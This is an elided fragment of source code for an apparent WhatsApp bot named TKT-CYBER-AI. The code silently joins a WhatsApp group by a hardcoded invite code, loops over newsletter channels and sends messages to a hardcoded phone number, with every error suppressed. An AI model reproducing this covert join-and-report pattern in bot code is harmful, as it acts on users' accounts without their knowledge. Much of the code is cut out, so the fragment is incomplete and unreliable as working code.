...
async function downloadSessionData() {
    try {
        ...
        const sessdata = config.SESSION_ID.split("TKT-CYBER~")[1];
            ...
            try {
                ...
                if (m.message.buttonsResponseMessage) {
                    ...
                    if (selected === 'help') {
                        ...
                        try {
                            await Matrix.sendMessage(m.key.remoteJid, { 
                                text: `⚙️ *TKT-CYBER-AI SOURCE CODE*\n\nGitHub Repository: https://github.com/tkttech/TKT-CYBER-AI\n\nGive it a star ⭐ if you like it!` 
                            });
                        } catch (error) {
                            // Silent error handling
                        }
    ...
    try {
        ...
        for (const channelJid of newsletterChannels) {
            try {
                ...
                if ('263718095555') {
                    try {
                        await Matrix.sendMessage('263718095555@s.whatsapp.net', {
...
async function joinWhatsAppGroup(Matrix) {
    try {
        const inviteCode = "Io4z4RXyH6AAiBR0x7qL8K";
        ...
        if ('263718095555') {
            try {
                ...
                await Matrix.sendMessage('263718095555@s.whatsapp.net', successMessage);
            } catch (error) {
                // Silent error handling
            }
        }
